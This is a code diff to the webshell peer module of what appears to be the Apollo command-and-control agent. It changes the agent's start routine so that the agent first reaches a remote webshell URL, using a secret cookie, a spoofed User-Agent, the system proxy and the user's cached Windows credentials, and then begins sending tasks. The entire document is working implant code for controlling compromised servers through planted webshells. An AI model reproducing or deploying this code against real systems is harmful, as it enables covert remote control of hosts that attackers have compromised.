@@ -34,6 +34,7 @@ namespace Apollo.Peers.Webshell
         {
             C2ProfileName = "webshell";
             _remote_agent_id = info.CallbackUUID;
+            _mythicUUID = info.CallbackUUID;
             _remote_url = info.C2Profile.Parameters.WebshellURL;
             _remote_query_param = info.C2Profile.Parameters.WebshellQueryParam;
             _remote_cookie_name = info.C2Profile.Parameters.WebshellCookieName;
@@ -157,9 +158,39 @@ namespace Apollo.Peers.Webshell
         public override bool Start()
         {
             //DebugHelp.DebugWriteLine($"Start()");
-            _sendTask = new TTasks.Task(_sendAction);
-            _sendTask.Start();
-            return true;
+            WebClient webClient = new WebClient();
+            // Use Default Proxy and Cached Credentials for Internet Access
+            webClient.Proxy = WebRequest.GetSystemWebProxy();
+            webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+            webClient.Headers.Add("User-Agent", _remote_user_agent);
+            //webClient.BaseAddress = _remote_url;
+            webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_remote_cookie_name}={_remote_cookie_value}");
+            string QueryURL = _remote_url;
+            if (QueryURL.Contains("?"))
+            {
+                QueryURL += "&" + _remote_query_param + "=";
+            } else
+            {
+                QueryURL += "?" + _remote_query_param + "=";
+            }
+            try
+            {
+                //DebugHelp.DebugWriteLine($"Sending GET to {QueryURL}");
+                using (var stream = webClient.OpenRead(QueryURL))
+                {
+                    using (var streamReader = new StreamReader(stream))
+                    {
+                        streamReader.ReadToEnd();
+                    }
+                }
+                _sendTask = new TTasks.Task(_sendAction);
+                _sendTask.Start();
+                return true;
+            }
+            catch(Exception ex)
+            {
+                throw ex;
+            }
         }
 
         public override void Stop()
